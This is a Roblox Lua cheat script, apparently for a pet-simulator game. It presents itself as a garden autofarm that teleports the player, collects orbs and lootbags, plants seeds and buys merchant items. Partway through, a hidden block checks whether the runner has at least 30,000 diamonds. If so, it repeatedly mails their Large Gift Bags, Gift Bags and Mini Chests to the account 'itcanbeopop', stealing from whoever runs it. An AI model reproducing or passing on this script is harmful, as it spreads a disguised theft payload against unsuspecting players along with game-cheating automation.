getgenv().autoGarden = true
getgenv().InstaPlant = false
getgenv().Water = true

local Player = game:GetService("Players").LocalPlayer
local RepStor = game.ReplicatedStorage
local Library = require(RepStor.Library)
local HRP = Player.Character.HumanoidRootPart
local saveMod = require(RepStor.Library.Client.Save)

local args

function getDiamonds() return Player.leaderstats["💎 Diamonds"].Value end

function getInfo(name) return saveMod.Get()[name] end

-- AUTO ORB
local autoOrbConnection = nil
local autoLootBagConnection = nil
for i, v in workspace.__THINGS.Orbs:GetChildren() do
	Library.Network.Fire("Orbs: Collect",{tonumber(v.Name)})
	Library.Network.Fire("Orbs_ClaimMultiple",{[1]={[1]=v.Name}})
	task.wait()
	v:Destroy()
end
for i, v in workspace.__THINGS.Lootbags:GetChildren() do
	Library.Network.Fire("Lootbags_Claim",{v.Name})
	task.wait()
	v:Destroy()
end
autoOrbConnection = workspace.__THINGS.Orbs.ChildAdded:Connect(function(v)
	Library.Network.Fire("Orbs: Collect",{tonumber(v.Name)})
	Library.Network.Fire("Orbs_ClaimMultiple",{[1]={[1]=v.Name}})
	task.wait()
	v:Destroy()
end)
autoLootBagConnection = workspace.__THINGS.Lootbags.ChildAdded:Connect(function(v)
	Library.Network.Fire("Lootbags_Claim",{v.Name})
	task.wait()
	v:Destroy()
end)

pcall(function()
    local success = Library.Network.Invoke("Mailbox: Claim All")
    if success then
        print("Claimed Mail!")
    end
    task.wait(1)
end)

if getDiamonds() >= 30000 then
    local largeGiftBagCheckDone, smallGiftBagCheckDone
    for ID, itemTable in pairs(getInfo("Inventory")["Misc"]) do
        if largeGiftBagCheckDone and smallGiftBagCheckDone then break end
        if itemTable.id == "Large Gift Bag" then
            largeGiftBagCheckDone = true
            if itemTable._am and itemTable._am >= 5 then
                repeat
                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
                        itemTable._am)
                until success
            end
        elseif itemTable.id == "Gift Bag" then
            smallGiftBagCheckDone = true
            if itemTable._am and itemTable._am >= 10 then
                repeat
                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
                        itemTable._am)
                until success
            end
        elseif itemTable.id == "Mini Chest" then
            smallGiftBagCheckDone = true
            if itemTable._am and itemTable._am >= 5 then
                repeat
                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
                        itemTable._am)
                until success
            end
        end
    end
end

while getgenv().autoGarden do
    HRP.CFrame = CFrame.new(184,23,1989) -- TP to gardening entry door
    task.wait(60) -- Added delay here just incase of unexpected lag during teleport
    HRP.CFrame = CFrame.new(-449,110,-1399) -- TP to center pot
    task.wait()
    for i = 1, 10 do
        Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "PlantSeed", i, "Diamond") -- Plant seed
        if getgenv().InstaPlant then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "InstaGrowSeed", i) end
        if getgenv().Water then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "WaterSeed", i) end -- Water seed
        Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "ClaimPlant", i) -- Claim plant
    end
    task.wait()
    HRP.CFrame = CFrame.new(-533,108,-1401) -- TP to gardening exit door
    task.wait(60) -- Added delay here just incase of unexpected lag during teleport
    HRP.CFrame = CFrame.new(819,16,1493) -- TP to Advanced Merchant area center point
    for i = 1, 6 do
        task.wait()
        args = {
            [1] = "AdvancedMerchant",
            [2] = i
        }
        game:GetService("ReplicatedStorage").Network.Merchant_RequestPurchase:InvokeServer(unpack(args))
    end
    task.wait(60)
    HRP.CFrame = CFrame.new(260,16,2145) -- TP to Garden Merchant area center point
    for i = 1, 6 do
        task.wait()
        args = {
            [1] = "GardenMerchant",
            [2] = i
        }
        game:GetService("ReplicatedStorage").Network.Merchant_RequestPurchase:InvokeServer(unpack(args))
    end
    task.wait(1300)
end
